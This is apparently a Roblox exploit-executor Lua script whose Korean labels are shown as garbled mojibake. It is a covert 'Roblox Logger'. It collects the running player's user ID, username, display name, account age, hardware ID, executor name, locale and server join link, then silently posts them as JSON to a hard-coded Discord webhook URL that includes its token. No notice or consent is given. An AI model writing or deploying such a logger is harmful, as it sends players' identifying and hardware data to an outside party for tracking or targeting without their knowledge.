local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local LocalizationService = game:GetService("LocalizationService")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local MarketplaceService = game:GetService("MarketplaceService")

local plr = LocalPlayer
local placeId = game.PlaceId
local jobId = game.JobId

local WebhookUrl = getgenv().WebhookUrl or "https://discord.com/api/webhooks/1396127363707699341/EwEfN81d2322RWK17YKnekwUbJZ4lfAJ3QVupznPdpyewmCufyzMKbX5txmaJbDuhmld"

local function formatTime(seconds)
    local h = seconds // 3600
    seconds = seconds - h * 3600
    local m = seconds // 60
    local s = seconds - m * 60
    return string.format("%02d:%02d:%02d", h, m, s)
end

local userId = plr and plr.UserId or 0
local displayName = plr and plr.DisplayName or "Unknown"
local username = plr and plr.Name or "Unknown"
local accountAge = plr and plr.AccountAge or 0

local executorName = "ì•Œ ìˆ˜ ì—†ìŒ"
if identifyexecutor then
    pcall(function() executorName = identifyexecutor() end)
end
local hwid = "ì•Œ ìˆ˜ ì—†ìŒ"
if get_hwid then
    pcall(function() hwid = get_hwid() end)
end

local ping = 0
if plr and plr.GetNetworkPing then
    ping = math.floor(plr:GetNetworkPing() * 2000)
end
local playerCount = #Players:GetPlayers()
local reconnectLink = "roblox://placeId=" .. placeId .. "&gameInstanceId=" .. jobId

local descriptionLines = {
    "**ğŸ‘¤ í”Œë ˆì´ì–´ ì •ë³´**",
    "> ğŸ†” **ìœ ì € Id:** " .. userId,
    "> ğŸ« **í‘œì‹œ ì´ë¦„:** " .. displayName,
    "> ğŸŸï¸ **ì‚¬ìš©ìëª…:** " .. username,
    "> ğŸ“… **ê³„ì • ìƒì„±ì¼:** " .. accountAge .. "ì¼ ì „",
    "",
    "**ğŸ–¥ï¸ ì¥ì¹˜ ì •ë³´**",
    "> ğŸ•’ **ì‹œê°„:** " .. os.date("%X"),
    "> ğŸ“† **ë‚ ì§œ:** " .. os.date("%Y-%m-%d"),
    "> ğŸ’¾ **ë©”ëª¨ë¦¬ ì‚¬ìš©ëŸ‰:** " .. (collectgarbage and (collectgarbage("count") // 1) or "N/A") .. "KB",
    "> ğŸŒ **ì‚¬ìš© ì–¸ì–´:** " .. (LocalizationService and LocalizationService.RobloxLocaleId or "Unknown"),
    "",
    "**â˜‘ï¸ ì‹¤í–‰ê¸° ì •ë³´**",
    "> ğŸ“¼ **ì´ë¦„:** " .. executorName,
    "> ğŸ”‘ **HWID:** " .. hwid,
    "",
    "**ğŸ® ê²Œì„ ì •ë³´**",
    "> ğŸ“Œ **ì´ë¦„:** " .. ((MarketplaceService and pcall(function() return MarketplaceService:GetProductInfo(placeId).Name end) and MarketplaceService:GetProductInfo(placeId).Name) or "Unknown"),
    "> ğŸ“œ **Place Id:** " .. placeId,
    "",
    "**ğŸŒ ì„œë²„ ì •ë³´**",
    "> ğŸ“¶ **í•‘:** " .. ping .. "ms",
    "> ğŸ‘¥ **í”Œë ˆì´ì–´ ìˆ˜:** " .. playerCount,
    "> ğŸ”— **ì ‘ì† ë§í¬:** ```" .. reconnectLink .. "```"
}

local descriptionText = table.concat(descriptionLines, "\n")

local payload = HttpService:JSONEncode({
    content = "```ğŸ‘ï¸â€ğŸ—¨ï¸|NPDL] : New Player Data Logged!```",
    embeds = {{
        title = "Roblox Logger",
        description = descriptionText,
        color = tonumber("0x3498db"),
        author = {
            name = string.format("%s (%s)", displayName or "Unknown", username or "Unknown")
        },
        footer = {
            text = "Logger â€¢ " .. os.date("%Y-%m-%d %H:%M:%S")
        }
    }}
})

local request = http_request or request or HttpPost or syn and syn.request or nil
if request then
    pcall(function()
        request({
            Url = WebhookUrl,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = payload
        })
    end)
end
